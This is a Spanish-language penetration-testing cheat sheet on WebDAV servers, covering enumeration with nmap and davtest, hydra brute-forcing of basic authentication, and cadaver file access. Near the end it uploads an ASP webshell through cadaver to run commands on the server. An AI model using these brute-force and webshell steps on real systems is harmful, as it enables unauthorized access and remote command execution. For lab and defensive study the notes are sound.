# WebDAV: Acceso y Descarga de Archivos con davtest

## 1. ¿Qué es WebDAV?

- WebDAV (Web Distributed Authoring and Versioning) es una extensión del protocolo HTTP que permite la gestión colaborativa de archivos en servidores web.
- Permite crear, mover, copiar, eliminar archivos y directorios remotamente.
- Comúnmente está habilitado en servidores IIS, Apache, y otros.

---

## 2. Cómo conseguir acceso a WebDAV

### a) Enumerar servidores con WebDAV activo

- Busca servidores HTTP con WebDAV habilitado (puerto 80 o 443).
- Usa `nmap` con scripts NSE:

```bash
nmap -p 80,443 --script http-webdav-scan <IP_objetivo>
```

### b) Probar acceso anónimo

- Algunos servidores permiten acceso sin autenticación o con credenciales por defecto.
- Prueba con clientes WebDAV o herramientas como `davtest`.

### c) Probar credenciales

- Usa herramientas para fuerza bruta o listas de credenciales si hay autenticación.

---

## 3. Uso de davtest para evaluar WebDAV

`davtest` es una herramienta para probar servidores WebDAV en búsqueda de métodos permitidos y posibles vulnerabilidades.

### a) Escaneo básico

```bash
davtest -url http://<IP_objetivo>/
```


Esto prueba métodos HTTP como PROPFIND, PUT, DELETE, MOVE, LOCK, etc.

### b) Probar subida de archivos (PUT)

Si el servidor permite el método PUT, puedes intentar subir archivos:

```bash
davtest -url http://<IP_objetivo>/ -upload
```

### c) Descarga de archivos

Si el servidor tiene archivos disponibles, puedes descargarlos con `curl`, `wget` o directamente con un navegador.

Ejemplo con `curl`:

```bash
curl -O http://<IP_objetivo>/ruta/al/archivo.txt
```

---

## 4. Fuerza Bruta en WebDAV con Hydra

Puedes usar `hydra` para probar combinaciones de usuarios y contraseñas contra un servidor WebDAV protegido con autenticación básica.

```bash
hydra -L users.txt -P passwords.txt <IP_objetivo> http-get /path -s 80 -V
```

- `-L users.txt`: archivo con lista de usuarios
- `-P passwords.txt`: archivo con lista de contraseñas
- `<IP_objetivo>`: IP o dominio del servidor WebDAV
- `http-get /path`: especifica el método HTTP y ruta para la autenticación (ajusta `/path` a la ruta WebDAV)
- `-s 80`: puerto (cámbialo si usas HTTPS o puerto distinto)
- `-V`: modo verbose para ver intentos en pantalla

### Ejemplo concreto:

```bash
hydra -L users.txt -P passwords.txt 192.168.1.100 http-get /webdav/ -s 80 -V
```

Este comando intentará acceder a `http://192.168.1.100/webdav/` con usuarios y contraseñas listados, mostrando resultados en pantalla.

---
### Conectarse con credenciales:
````
davtest -auth user:password -url http://dominio/path
````

## 5. Uso de Cadaver para interactuar con WebDAV desde la terminal

`cadaver` es un cliente WebDAV en consola que permite navegar y manipular recursos WebDAV de forma interactiva.

### a) Conectar al servidor WebDAV

```bash
cadaver http://<IP_objetivo>/<ruta_webdav>
```

Ejemplo:

```bash
cadaver http://192.168.1.100/webdav/
```

### b) Comandos básicos dentro de Cadaver

- `ls` — Listar archivos y carpetas.
- `cd <directorio>` — Cambiar de directorio.
- `get <archivo>` — Descargar un archivo localmente.
- `put <archivo>` — Subir un archivo desde tu máquina.
- `rm <archivo>` — Eliminar un archivo remoto.
- `mkdir <directorio>` — Crear un directorio remoto.
- `exit` — Salir de la sesión.

### c) Ejemplo de sesión

```bash
$ cadaver http://192.168.1.100/webdav/
dav:/webdav/> ls
archivo1.txt  carpeta1/
dav:/webdav/> cd carpeta1
dav:/webdav/carpeta1/> get archivo2.txt
dav:/webdav/carpeta1/> exit
```
Después de entrar con cadaver podemos lanzar una shell a la web, haciendo:

````
put /usr/share/webshells/asp/webshell.asp
````
Después entramos al navegador de donde esta WebDav y ya podemos ejecutar comandos entrando con las credenciales claro.
---

## 6. Pasos para descargar archivos con davtest, cadaver y herramientas complementarias

1. Ejecuta `davtest` para identificar métodos habilitados.
2. Si hay acceso anónimo o con credenciales válidas, navega por las rutas públicas o sube archivos para pruebas.
3. Usa herramientas como `curl`, `wget` o clientes WebDAV como `cadaver` para descargar archivos descubiertos.



